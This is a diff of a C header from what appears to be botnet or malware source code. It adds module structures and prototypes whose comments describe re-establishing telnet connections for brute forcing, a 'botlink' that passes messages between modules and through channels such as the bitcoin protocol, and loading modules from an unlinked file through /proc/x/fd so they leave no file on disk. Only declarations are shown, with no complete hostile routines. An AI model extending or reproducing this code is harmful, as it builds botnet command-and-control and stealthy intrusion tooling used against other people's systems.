@@ -123,6 +123,9 @@ typedef struct _module_funcs {
     module_func connect;
     // end of connection.. added so telnet can re-establish for brute forcing
     module_func disconnect;
+    // needed another way than incoming for messages between modules
+    // so botlink can communicate through other protocols like bitcoin
+    module_func message;
 } ModuleFuncs;
 
 struct _nodes;
@@ -136,14 +139,23 @@ typedef struct _modules {
     int fd;
     // timestamp for creation
     uint32_t start_ts;
+    // is this a compiled in module? ie: cannot be deleted
+    int binary;
     
     // identifiers so botlink, and other functions can direct messages to a particular module
     int id;
+    
+    int type;
     
     // if we are attempting to listen
     int listen_port;
     // state of crypto currency (our connections, etc)
     int state;
+    
+    // outfd started as extenal module, and merged here..
+    // its for an open file that gets unlinked so it can be loaded
+    // via /proc/x/fd
+    int outfd;
     
     uint32_t timer_ts;
     int timer_interval;
@@ -265,6 +277,11 @@ int ExternalDeinit(ExternalModules *eptr);
 int ExternalInit(ExternalModules *eptr);
 int ExternalEnable(ExternalModules *eptr);
 int ExternalDisable(ExternalModules *eptr);
-ExternalModules *ExternalAdd(ExternalModules **, int type, int id, char *buf, int size, int init);
 void *CustomPtr(Connection *cptr, int custom_size);
 
+Modules *ModuleFind(Modules *, int id);
+
+void *ModuleCustomPtr(Modules *mptr, int custom_size);
+
+
+int python_module_deinit(Modules *mptr); 
